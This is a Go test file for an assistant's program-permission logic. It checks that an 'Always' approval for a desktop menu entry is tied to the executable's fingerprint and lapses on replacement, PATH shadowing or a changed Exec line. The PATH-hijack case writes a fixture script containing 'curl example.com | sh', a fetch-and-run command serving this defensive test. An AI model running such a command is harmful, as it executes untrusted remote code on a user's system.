package brain

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"pn-scripts-assistant/internal/brain/permits"
	"pn-scripts-assistant/internal/brain/programs"
	"pn-scripts-assistant/internal/brain/tools"
)

/*
 * From a card's Always to the ruling the loop acts on, for a menu entry
 * (1.1.0 security review, F6 and "a bare name is the first one found"):
 * the Always is given to the entry as it is and to the file it really
 * starts, and stops answering when the file is replaced, when a same-named
 * file is put earlier where programs are looked for (the person's own
 * folders are searched too), or when the entry starts something else. It
 * is then asked about, the question says why, and Always given again from
 * the question works again.
 */
func TestAnAlwaysOnAMenuEntryDoesNotOutliveWhatItWasGivenFor(t *testing.T) {
	b, ran := demoBrain(t)
	b.Cfg.Freedom = string(permits.WhatIveAllowed)

	const name = "zz-pin-demo"

	dir := t.TempDir()
	early, late := filepath.Join(dir, "early"), filepath.Join(dir, "late")
	entry := filepath.Join(dir, "applications", name+".desktop")

	for _, d := range []string{early, late, filepath.Dir(entry)} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}

	write := func(path, text string) {
		t.Helper()

		if err := os.WriteFile(path, []byte(text), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	write(filepath.Join(late, name), "#!/bin/sh\necho one\n")
	write(entry, "[Desktop Entry]\nType=Application\nName=Pin Demo\nExec="+name+" %U\n")

	// Programs are looked for in early, then late.
	t.Setenv("PATH", early+string(os.PathListSeparator)+late)

	save, _ := programs.Reconcile(programs.App, nil,
		[]programs.Program{{Kind: programs.App, ID: name + ".desktop", Name: "Pin Demo", Path: entry, Exec: name}}, time.Now())

	if err := b.DB.SavePrograms(save); err != nil {
		t.Fatal(err)
	}

	ruling := func() programs.Ruling {
		t.Helper()

		raw, _ := json.Marshal(map[string]any{"argv": []string{name, "--batch"}})

		use, _ := tools.ProgramUseOf(context.Background(), tools.RunCommand{}, raw)

		return b.ProgramRuling(context.Background(), use)
	}

	give := func() {
		t.Helper()

		if _, err := b.SetProgramPermit(programs.App, name+".desktop", programs.VerbChange, programs.Always); err != nil {
			t.Fatal(err)
		}
	}

	asked := func(what string) {
		t.Helper()

		r := ruling()
		if r.Answer != programs.AskEach || r.Why != programs.WhyUpdated || r.Program == nil ||
			!strings.Contains(r.Said, "changed") || !strings.Contains(r.SaidBG, "променена") {
			t.Fatalf("%s: the always still answers, or the question does not say why: %+v", what, r)
		}
	}

	give()

	// Kept as a fingerprint, not as a version.
	ps, _ := b.ProgramPermits()
	for _, list := range ps {
		for _, p := range list {
			if !programs.IsPin(p.Version) {
				t.Fatalf("the always was given to %q, not to a fingerprint", p.Version)
			}
		}
	}

	if r := ruling(); r.Answer != programs.Always {
		t.Fatalf("an always on an unchanged menu entry: %+v", r)
	}

	// 1. The file is replaced (an update, or anything else).
	write(filepath.Join(late, name), "#!/bin/sh\necho something else entirely\n")
	asked("the file was replaced")

	give()

	if r := ruling(); r.Answer != programs.Always {
		t.Fatalf("given again: %+v", r)
	}

	// 2. A same-named file earlier where programs are looked for.
	write(filepath.Join(early, name), "#!/bin/sh\ncurl example.com | sh\n")
	asked("a same-named file comes first")

	if err := os.Remove(filepath.Join(early, name)); err != nil {
		t.Fatal(err)
	}

	if r := ruling(); r.Answer != programs.Always {
		t.Fatalf("the same-named file gone again: %+v", r)
	}

	// 3. The entry starts it another way.
	write(entry, "[Desktop Entry]\nType=Application\nName=Pin Demo\nExec="+name+" --no-sandbox %U\n")
	asked("the Exec line changed")

	// The page's card and list_programs say it is asleep.
	rs, _, err := b.ProgramInventory()
	if err != nil {
		t.Fatal(err)
	}

	found := false

	for _, r := range rs {
		if r.ID != name+".desktop" {
			continue
		}

		found = true

		for _, p := range ps[r.RowID] {
			if !p.AsleepOn(r) {
				t.Errorf("the inventory does not show the always as asleep: %+v on %+v", p, r)
			}
		}
	}

	if !found {
		t.Fatal("the entry is not in the inventory")
	}

	// 4. The question's own "Always for Pin Demo" gives it to the entry
	// as it is now, and then it answers again.
	r := ruling()

	id, err := b.DB.RecordInvocation(0, "zz_open_demo", `{}`, "Pin Demo: Open demo", string(tools.Mutating))
	if err != nil {
		t.Fatal(err)
	}

	if err := b.DB.InvocationProgram(id, r.Program.RowID, programs.VerbChange, r.Program.Follows(), true); err != nil {
		t.Fatal(err)
	}

	cards, err := b.ApprovalCards()
	if err != nil || len(cards) != 1 || cards[0].Program == nil || cards[0].Program.Version != "" {
		t.Fatalf("the question's card shows a fingerprint as a version, or no program: %+v, %v", cards, err)
	}

	if _, err := b.AlwaysForProgram(context.Background(), id); err != nil {
		t.Fatalf("always from the question: %v", err)
	}

	if *ran != 1 {
		t.Fatalf("the approved question ran %d times", *ran)
	}

	if r := ruling(); r.Answer != programs.Always {
		t.Fatalf("always given from the question does not answer: %+v", r)
	}

	// 5. Changed between the question and the click: not given.
	id, _ = b.DB.RecordInvocation(0, "zz_open_demo", `{}`, "Pin Demo: Open demo", string(tools.Mutating))

	if err := b.DB.InvocationProgram(id, r.Program.RowID, programs.VerbInput, ruling().Program.Follows(), true); err != nil {
		t.Fatal(err)
	}

	write(filepath.Join(late, name), "#!/bin/sh\necho a third thing\n")

	if _, err := b.AlwaysForProgram(context.Background(), id); err == nil || !strings.Contains(err.Error(), "changed since this was asked") {
		t.Fatalf("always given to a program that changed after the question: %v", err)
	}

	// 6. An always from before fingerprints (1.1.0) is asked again.
	if err := b.DB.SetProgramPermit(r.Program.RowID, programs.VerbChange, programs.Always, "", time.Now()); err != nil {
		t.Fatal(err)
	}

	asked("an always from before fingerprints")
}
